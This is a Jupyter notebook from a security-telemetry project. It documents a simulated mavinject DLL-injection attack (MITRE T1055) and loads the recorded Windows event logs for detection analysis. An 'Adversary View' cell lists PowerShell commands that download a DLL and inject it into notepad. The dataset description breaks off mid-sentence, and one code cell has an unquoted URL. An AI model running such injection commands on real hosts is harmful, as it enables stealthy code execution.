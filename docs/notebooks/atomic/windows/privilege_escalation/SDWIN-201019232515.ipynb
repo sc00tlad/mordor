{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "d7ac8dc0",
   "metadata": {},
   "source": [
    "# Mavinject Process DLL Injection"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "081a546a",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6f26b9cb",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| Contributors      | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| Creation Date     | 2020/10/19 |\n",
    "| Modification Date | 2020/10/19 |\n",
    "| Tactics           | [TA0004](https://attack.mitre.org/tactics/TA0004),[TA0005](https://attack.mitre.org/tactics/TA0005) |\n",
    "| Techniques        | [T1055](https://attack.mitre.org/techniques/T1055) |\n",
    "| Tags              | art.74496461-11a1-4982-b439-4d87a550d254 |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "af8d1bc3",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents adversaries leveraging"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "9c850e26",
   "metadata": {},
   "source": [
    "## Datasets Downloads"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c4bcea19",
   "metadata": {},
   "source": [
    "\n",
    "| Type | Link   |\n",
    "|:-------------|:-------|\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/psh_mavinject_dll_notepad.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/psh_mavinject_dll_notepad.zip) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ca529ae4",
   "metadata": {},
   "source": [
    "## Simulation Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "86740ee1",
   "metadata": {},
   "source": [
    "### Tools"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "8ce98f38",
   "metadata": {},
   "source": [
    "\n",
    "| type | Name | Module |\n",
    "|:-----|:-----|--------|\n",
    "| Manual | powershell | [powershell](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1055/T1055.md#atomic-test-1---process-injection-via-mavinjectexe) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f5e7ade8",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "PS C:\\Users\\wardog> Invoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055/src/x64/T1055.dll\" -OutFile C:\\ProgramData\\T1055.dll\n",
    "PS C:\\Users\\wardog> $mypid = (Start-Process notepad -PassThru).id\n",
    "PS C:\\Users\\wardog> mavinject $mypid /INJECTRUNNING C:\\ProgramData\\T1055.dll\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0574131c",
   "metadata": {},
   "source": [
    "## Explore Datasets"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "79545fb9",
   "metadata": {},
   "source": [
    "### Download & Decompress Dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7ff1159a",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "from zipfile import ZipFile\n",
    "from io import BytesIO\n",
    "\n",
    "url = https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/psh_mavinject_dll_notepad.zip\n",
    "zipFileRequest = requests.get(url)\n",
    "zipFile = ZipFile(BytesIO(zipFileRequest.content))\n",
    "datasetJSONPath = zipFile.extract(zipFile.namelist()[0])"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "defe4ff0",
   "metadata": {},
   "source": [
    "### Read JSON File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "fe0c95fb",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pandas.io import json\n",
    "\n",
    "df = json.read_json(path_or_buf=datasetJSONPath, lines=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0e03cf55",
   "metadata": {},
   "source": [
    "### Access Security Events"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "135b9ea1",
   "metadata": {},
   "outputs": [],
   "source": [
    "df.groupby(['Channel']).size().sort_values(ascending=False)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "8c31712c",
   "metadata": {},
   "source": [
    "## References\n",
    "* [https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1055/T1055.md#atomic-test-1---process-injection-via-mavinjectexe](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1055/T1055.md#atomic-test-1---process-injection-via-mavinjectexe) "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 5
}
